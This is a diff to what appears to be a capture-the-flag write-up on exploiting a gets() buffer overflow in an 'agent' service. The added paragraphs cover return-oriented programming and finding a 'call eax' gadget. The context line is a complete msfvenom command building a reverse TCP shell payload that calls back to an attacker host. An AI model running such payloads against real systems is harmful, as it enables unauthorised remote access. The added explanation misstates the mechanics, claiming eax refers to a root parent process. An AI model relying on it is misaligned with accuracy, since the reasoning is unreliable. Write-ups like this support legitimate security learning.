@@ -178,6 +178,10 @@ gets((char *)&str);*
 
 This reads user input, however the size of the input isn't defined, looks like a possible buffer overflow, basically we're passing in more information that the command is going to properly handle and extending the application's memory outside of it's contextual boundary causing an error to occur.
 
+After doing some reading on ways to exploit the buffer overflow I stumbled onto the idea of return oriented programming, tl;dr; Its a way to execute a buffer overflow when defense mechanisms like code-signing and non-executable memory are employed.  In this technique you can send machine language that is already in the machine's memory, whether through the program being exploited itself or other shared libraries.  When these pieces when combined can be used to perform actions on the remote machine.  
+
+I was able to upload the agent binaries we got earlier to ropshell.com which analyzes the compiled code for items in memory that can be used in an exploit, in this case: call eax.  Ater reading through some reference docs for assembly, specifically x86 I have surmised that with our goal being getting a root shell by escaping the 'agent' service causing a buffer overflow to occur and running 'call eax.'  In doing so we would be calling eax which is potentially a reference to the parent process of the service, in this case a shell runnint as root.  I'm basing this on the concept that eax register in the processor can be used to execute code in the register to circumvent normal program execution.
+
 Now to generate a buffer to overflow using msfvenom:
 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.161.128 LPORT=4445 -f python -b "\x00\x0a\x0d"
